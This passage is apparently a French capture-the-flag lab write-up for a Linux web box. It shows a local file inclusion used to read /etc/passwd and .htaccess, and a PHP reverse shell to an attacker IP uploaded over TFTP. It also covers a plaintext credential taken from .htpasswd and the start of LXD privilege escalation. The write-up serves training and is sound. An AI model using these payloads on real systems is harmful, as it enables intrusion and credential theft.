</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="p">|</span><span class="w"> </span>http-title:<span class="w"> </span>Site<span class="w"> </span>doesn<span class="err">&#39;</span>t<span class="w"> </span>have<span class="w"> </span>a<span class="w"> </span>title<span class="w"> </span><span class="o">(</span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="p">|</span>_Requested<span class="w"> </span>resource<span class="w"> </span>was<span class="w"> </span>http://10.129.102.34/?file<span class="o">=</span>home.php
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.29<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">7</span>.77<span class="w"> </span>seconds
</span></code></pre></div>
<p>Nous avons juste un port 80 ouvert on dirais, avec :    </p>
<ul>
<li>Un site en php : http://10.129.102.34/?file=home.php  </li>
<li>sur un serveur Apache httpd 2.4.29</li>
</ul>
<p><img alt="Page d'accueil" src="../../img/page-port-80.png" title="Possible LFI avec var file sur url" /></p>
<p>Rien dâintÃ©ressant en navigant sur le site sauf le fait que l'url semble inclure des fichiers.php donc possible <strong>LFI</strong> (<em>local file incusion</em>)</p>
<p>D'ailleurs on tente de voir le .htaccess comme ceci et Ã§a marche : </p>
<blockquote>
<p>http://10.129.102.34/?file=.htaccess</p>
</blockquote>
<p>Et cela retourne :</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>RewriteEngine<span class="w"> </span>On<span class="w"> </span>RewriteCond<span class="w"> </span>%<span class="o">{</span>THE_REQUEST<span class="o">}</span><span class="w"> </span>^GET.*index<span class="se">\.</span>php<span class="w"> </span><span class="o">[</span>NC<span class="o">]</span><span class="w"> </span>RewriteRule<span class="w"> </span><span class="o">(</span>.*?<span class="o">)</span>index<span class="se">\.</span>php/*<span class="o">(</span>.*<span class="o">)</span><span class="w"> </span>/<span class="nv">$1$2</span><span class="w"> </span><span class="o">[</span><span class="nv">R</span><span class="o">=</span><span class="m">301</span>,NE,L<span class="o">]</span><span class="w"> </span><span class="c1"># #AuthType Basic #AuthUserFile /var/www/html/.htpasswd #Require valid-user </span>
</span></code></pre></div>
<p>Ce qui montre bien qu'il y a inclusion de fichier et aucun filtrage. </p>
<p>On va tenter d'afficher <strong>/etc/passwd</strong> pour voir:  </p>
<ul>
<li>http://10.129.102.34/?file=../../../etc/passwd</li>
<li>http://10.129.102.34/?file=/etc/passwd</li>
</ul>
<p>Cela marche aussi ! On fait ctrl + u pour avoir le contenu sous forme de lignes. et on le met dans un fichier sur notre disque avec vim. </p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>root:x:0:0:root:/root:/bin/bash
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>sync:x:4:65534:sync:/bin:/bin/sync
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>list:x:38:38:Mailing<span class="w"> </span>List<span class="w"> </span>Manager:/var/list:/usr/sbin/nologin
</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>gnats:x:41:41:Gnats<span class="w"> </span>Bug-Reporting<span class="w"> </span>System<span class="w"> </span><span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>systemd-network:x:100:102:systemd<span class="w"> </span>Network<span class="w"> </span>Management,,,:/run/systemd/netif:/usr/sbin/nologin
</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>systemd-resolve:x:101:103:systemd<span class="w"> </span>Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>syslog:x:102:106::/home/syslog:/usr/sbin/nologin
</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>lxd:x:105:65534::/var/lib/lxd/:/bin/false
</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>pollinate:x:109:1::/var/cache/pollinate:/bin/false
</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a>mike:x:1000:1000:mike:/home/mike:/bin/bash
</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a>tftp:x:110:113:tftp<span class="w"> </span>daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
</span></code></pre></div>
<p>On va filtrer un peu pour trouver des comptes. </p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>â¯<span class="w"> </span>cat<span class="w"> </span>passwd_file<span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>nologin<span class="w"> </span>-v
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>root:x:0:0:root:/root:/bin/bash
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>sync:x:4:65534:sync:/bin:/bin/sync
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>lxd:x:105:65534::/var/lib/lxd/:/bin/false
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>pollinate:x:109:1::/var/cache/pollinate:/bin/false
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>mike:x:1000:1000:mike:/home/mike:/bin/bash
</span></code></pre></div>
<p>On commence a voir des users.</p>
<p>Vu la structure de l'url on va faire un test pour voir si le fichier home.php est la seule chose que est incluse et affichÃ©e.</p>
<p>Pour cela on fait ceci, puis on voit que les deux pages servent la mÃªme chose. Il n'y a pas de difference (voir le diff)</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>wget<span class="w"> </span>-qO-<span class="w"> </span>http://10.129.102.34:80/home.php<span class="w"> </span>&gt;<span class="w"> </span>test.txt
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>wget<span class="w"> </span>-qO-<span class="w"> </span>http://10.129.102.34/index.php<span class="w"> </span>&gt;<span class="w"> </span>test2.txt
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="c1"># Puis</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>â¯<span class="w"> </span>diff<span class="w"> </span>test.txt<span class="w"> </span>test2.txt
</span></code></pre></div>
<p>En fait au vu de ce qu'il y a dans le .htaccess il y a certainement une redirection. Voir <a href="https://httpd.apache.org/docs/current/mod/mod_rewrite.html">le module mod_rewrite</a> et les regles <a href="https://httpd.apache.org/docs/2.4/rewrite/flags.html">ici</a></p>
<p>Ici on aurait pu fuzz pour voir si on trouve d'autres resources, je me demande ce que cela donnerait avec la redirection.</p>
<p>Voyons d'abord comment cette fonctionnalitÃ© (LFI) pourrait fonctionner.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">])</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span>include<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">])</span><span class="p">;</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">    </span>header<span class="o">(</span><span class="s2">&quot;Location: http://</span><span class="nv">$_SERVER</span><span class="s2">[HTTP_HOST]/index.php?file=home.php&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="o">}</span>
</span></code></pre></div>
<p>Dans l'exemple ci-dessus, ce code se trouve dans index.php , il est utilisÃ© pour charger dynamiquement d'autres pages du site Web en utilisant la variable file comme point de contrÃ´le. Si cette variable n'a pas Ã©tÃ© spÃ©cifiÃ©e dans la requÃªte GET, la page rÃ©Ã©crit automatiquement l'URL (fais une redirection) et charge home.php . Si la valeur a Ã©tÃ© spÃ©cifiÃ©e, le code tente de charger une page Ã  partir de la valeur de la variable. Voir la function <a href="https://www.php.net/manual/en/function.header.php">header</a> dans le site php.</p>
<h2 id="tftp">TFTP</h2>
<p>Revenons Ã  la tÃ¢che Ã  accomplir, bien qu'une inclusion de fichiers locaux soit un excellent moyen de collecter des informations et de lire des fichiers systÃ¨me, l'objectif de chaque testeur d'intrusion est de rÃ©aliser l'exÃ©cution de code Ã  distance sur un systÃ¨me. Il existe une plÃ©thore de faÃ§ons dont un <strong>LFI</strong> peut se transformer en <strong>RCE</strong> (<em>Remote code execution</em>), depuis l'empoisonnement des journaux aux mots de passe en clair dans les fichiers de configuration et aux sauvegardes oubliÃ©es, mais dans ce cas, le fichier passwd nous a donnÃ© un <em>indice</em> important sur la faÃ§on de procÃ©der.</p>
<p>Le dernier utilisateur rÃ©pertoriÃ© s'appelle <strong>tftp</strong> .</p>
<p><code>tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin</code></p>
<p>Une recherche rapide sur Google rÃ©vÃ¨le que le protocole <a href="https://fr.wikipedia.org/wiki/Trivial_File_Transfer_Protocol">TFTP</a> (Trivial File Transfer Protocol) est un protocole simple qui fournit une fonction de transfert de fichiers de base sans authentification de l'utilisateur. TFTP est destinÃ© aux applications qui n'ont pas besoin des interactions sophistiquÃ©es fournies par le protocole de transfert de fichiers (FTP).
Il est Ã©galement rÃ©vÃ©lÃ© que TFTP utilise le protocole UDP (User Datagram Protocol) pour communiquer. Celui-ci est dÃ©fini comme un protocole de transport de donnÃ©es lÃ©ger qui fonctionne au-dessus d'IP.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>UDP fournit un mÃ©canisme pour dÃ©tecter les donnÃ©es corrompues dans les paquets, mais il ne tente pas de rÃ©soudre les autres problÃ¨mes qui surviennent avec les paquets, tels que les paquets perdus ou en dÃ©sordre.
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>Il est implÃ©mentÃ© dans la couche de transport du modÃ¨le OSI, connu comme un protocole rapide mais non fiable, contrairement Ã  TCP, qui est fiable mais plus lent qu&#39;UDP.
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>Tout comme TCP contient des ports ouverts pour des protocoles tels que HTTP, FTP, SSH, etc.; UDP a des ports pour des protocoles qui fonctionnent pour UDP.
</span></code></pre></div>
<p>On va faire un scan UDP mais on va le limiter aux 100 premiers ports (on triche un peu car Ã§a met une plombe...)</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>â¯<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span>-p1-100<span class="w"> </span><span class="m">10</span>.129.102.34
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-05-19<span class="w"> </span><span class="m">01</span>:53<span class="w"> </span>CEST
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.129.102.34
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.028s<span class="w"> </span>latency<span class="o">)</span>.
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">98</span><span class="w"> </span>closed<span class="w"> </span>udp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>port-unreach<span class="o">)</span>
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>PORT<span class="w">   </span>STATE<span class="w">         </span>SERVICE
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="m">68</span>/udp<span class="w"> </span>open<span class="p">|</span>filtered<span class="w"> </span>dhcpc
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="m">69</span>/udp<span class="w"> </span>open<span class="p">|</span>filtered<span class="w"> </span>tftp
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>
</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">106</span>.34<span class="w"> </span>seconds
</span></code></pre></div>
<p>En attendant on en profite pour installer <strong>tftp</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>tftp
</span></code></pre></div>
<p>Nous allons uploader un fichier reverse.php a fin d'Ã©tablir une connection avec notre machine.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>â¯<span class="w"> </span>tftp<span class="w"> </span><span class="m">10</span>.129.102.34
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>tftp&gt;<span class="w"> </span>put<span class="w"> </span>reverse.php<span class="w"> </span>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>Sent<span class="w"> </span><span class="m">75</span><span class="w"> </span>bytes<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">0</span>.1<span class="w"> </span>seconds
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>tftp&gt;<span class="w"> </span>quit
</span></code></pre></div>
<p>Et on lance une Ã©coute avec netcat : </p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">443</span>
</span></code></pre></div>
<p>Voici le contenu de notre fichier uploadÃ© :  </p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>â¯<span class="w"> </span>cat<span class="w"> </span>reverse.php<span class="w"> </span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>ââââââââ¬âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">       </span>â<span class="w"> </span>File:<span class="w"> </span>reverse.php
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>ââââââââ¼âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="w">   </span><span class="m">1</span><span class="w">   </span>â<span class="w"> </span>&lt;?php<span class="w"> </span>exec<span class="o">(</span><span class="s2">&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.15.253/443 0&gt;&amp;1&#39;&quot;</span><span class="o">)</span><span class="p">;</span>?&gt;
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>ââââââââ´âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ<span class="w"> </span>
</span></code></pre></div>
<p>On doit connaitre l'emplacement ou le fichier a Ã©tÃ© uploadÃ© avant de l'executer grace au LFI.</p>
<p>â¯ curl 'http://10.129.102.34/?file=/var/lib/tftpboot/reverse.php'</p>
<p>On entre en tant que www-data.</p>
<p>Le shell reÃ§u n'est pas complÃ¨tement interactif alors on lâamÃ©liore un peu :</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</span></code></pre></div>
<p>On entre avec le compte <strong>www-data</strong></p>
<h2 id="mouvement-lateral">Mouvement Lateral</h2>
<p>Avec le compte www-data nous n'avons pas le droit de faire grand chose.<br />
On commence a Ã©numÃ©rer, nous regardons donc dans le dossier web pour voir si on trouve des identifiants, voir mieux.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>www-data@included:/var/www/html$<span class="w"> </span>cat<span class="w"> </span>.htpasswd
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>cat<span class="w"> </span>.htpasswd
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>mike:Sheffield19
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>www-data@included:/var/www/html$<span class="w"> </span>
</span></code></pre></div>
<p>On trouve quelque chose qui ressemble a un pass avec le nom d'user dÃ©jÃ  rencontrÃ© dans le /etc/passwd<br />
mike:Sheffield19</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>www-data@included:/var/www/html$<span class="w"> </span>su<span class="w"> </span>mike<span class="w"> </span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>su<span class="w"> </span>mike
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>Password:<span class="w"> </span>Sheffield19
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>mike@included:/var/www/html$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/home/mike
</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="nb">cd</span><span class="w"> </span>/home/mike
</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>mike@included:~$<span class="w"> </span>ls
</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>ls
</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>user.txt
</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>mike@included:~$<span class="w"> </span>cat<span class="w"> </span>user<span class="w">   </span>
</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>cat<span class="w"> </span>user.txt<span class="w"> </span>
</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>a56ef91d70cfbf2cdb8f45..........
</span></code></pre></div>
<p>Nous avons le premier flag.</p>
<hr />
<p>&nbsp;</p>
<h2 id="escalade-de-privileges">Escalade de privilÃ¨ges</h2>
<p>Nous allons utiliser l'application <strong>LXC Distribution Builder</strong>.  </p>
<p>What is <a href="https://linuxcontainers.org/lxd/introduction/">LXD</a>? ; <a href="https://github.com/lxc/distrobuilder/blob/master/doc/howto/build.md">Howto</a></p>
<blockquote>
<p>LXD is a management API for dealing with LXC containers on Linux systems. It will
perform tasks for any members of the local lxd group. It does not make an effort to
match the permissions of the calling user to the function it is asked to perform.  </p>
</blockquote>
<p>On cherche une vuln avec et on trouve : </p>
<blockquote>
<p>A member of the local âlxdâ group can instantly escalate the privileges to root on the
host operating system. This is irrespective of whether that user has been granted sudo
rights and does not require them to enter their password. The vulnerability exists even
with the LXD snap package.</p>
</blockquote>
<p>Pour l'install de distrobuilder il faut prendre la derniÃ¨re version de go ! , sinon t'as une erreur avec make.</p>
<ol>
<li>TÃ©lÃ©charger <em>go1.20.4.linux-amd64.tar.gz</em> dans <strong>/usr/local/go</strong> puis :</li>
</ol>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>$<span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span>/usr/local/go<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>tar<span class="w"> </span>-C<span class="w"> </span>/usr/local<span class="w"> </span>-xzf<span class="w"> </span>go1.20.4.linux-amd64.tar.gz
</span></code></pre></div>
<ol>
<li>DÃ©sinstaller la version 1.17 qui viens avec parrot et prendre la 20.</li>
</ol>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>â¯<span class="w"> </span>sudo<span class="w"> </span>su
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>Mot<span class="w"> </span>de<span class="w"> </span>passe<span class="w"> </span>de<span class="w"> </span>rnek0<span class="w">Â </span>:<span class="w"> </span>
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>â¯<span class="w"> </span>rm<span class="w"> </span>-r<span class="w"> </span>/usr/lib/go-1.17
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>â¯<span class="w"> </span>ls<span class="w"> </span>/usr/lib/go-1.17
</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>lsd:<span class="w"> </span>/usr/lib/go-1.17:<span class="w"> </span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory<span class="w"> </span><span class="o">(</span>os<span class="w"> </span>error<span class="w"> </span><span class="m">2</span><span class="o">)</span>.
</span></code></pre></div>
<p>Ajouter a la var d'environnement.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>â¯<span class="w"> </span>go<span class="w"> </span>env
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>zsh:<span class="w"> </span><span class="nb">command</span><span class="w"> </span>not<span class="w"> </span>found:<span class="w"> </span>go
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>â¯<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/usr/local/go/bin
